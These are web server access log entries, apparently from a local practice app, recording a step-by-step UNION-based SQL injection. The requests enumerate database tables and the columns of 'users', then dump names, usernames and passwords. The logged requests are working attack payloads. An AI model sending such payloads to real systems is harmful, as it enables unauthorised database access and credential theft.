+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:17:10:05 +0000] "GET /vulnerabilities/sqli/?id=%25%27+and+1%3D0+union+select+null%2C+table_name+from+information_schema.tables+where+table_name+like+%27user%25%27%23&Submit=Submit HTTP/1.1" 200 1845 "http://localhost:4280/vulnerabilities/sqli/?id=%25%27+and+1%3D0+union+select+null%2C+table_name+from+information_schema.tables+%23&Submit=Submit" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:17:10:05 +0000] "GET /Vault_Tec/css/main.css HTTP/1.1" 200 1557 "http://localhost:4280/vulnerabilities/sqli/?id=%25%27+and+1%3D0+union+select+null%2C+table_name+from+information_schema.tables+where+table_name+like+%27user%25%27%23&Submit=Submit" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:17:10:05 +0000] "GET /Vault_Tec/js/add_event_listeners.js HTTP/1.1" 200 619 "http://localhost:4280/vulnerabilities/sqli/?id=%25%27+and+1%3D0+union+select+null%2C+table_name+from+information_schema.tables+where+table_name+like+%27user%25%27%23&Submit=Submit" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:17:10:05 +0000] "GET /Vault_Tec/js/Vault_TecPage.js HTTP/1.1" 200 809 "http://localhost:4280/vulnerabilities/sqli/?id=%25%27+and+1%3D0+union+select+null%2C+table_name+from+information_schema.tables+where+table_name+like+%27user%25%27%23&Submit=Submit" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:17:10:05 +0000] "GET /Vault_Tec/images/logo.png HTTP/1.1" 304 249 "http://localhost:4280/vulnerabilities/sqli/?id=%25%27+and+1%3D0+union+select+null%2C+table_name+from+information_schema.tables+where+table_name+like+%27user%25%27%23&Submit=Submit" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:17:10:25 +0000] "GET /vulnerabilities/sqli/?id=%25%27+and+1%3D0+union+select+null%2C+concat%28table_name%2C0x0a%2Ccolumn_name%29+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit HTTP/1.1" 200 1881 "http://localhost:4280/vulnerabilities/sqli/?id=%25%27+and+1%3D0+union+select+null%2C+table_name+from+information_schema.tables+where+table_name+like+%27user%25%27%23&Submit=Submit" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:17:11:11 +0000] "GET /vulnerabilities/sqli/?id=%25%27+and+1%3D0+union+select+null%2C+concat%28first_name%2C0x0a%2Clast_name%2C0x0a%2Cuser%2C0x0a%2Cpassword%29+from+users+%23&Submit=Submit HTTP/1.1" 200 1993 "http://localhost:4280/vulnerabilities/sqli/?id=%25%27+and+1%3D0+union+select+null%2C+concat%28table_name%2C0x0a%2Ccolumn_name%29+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
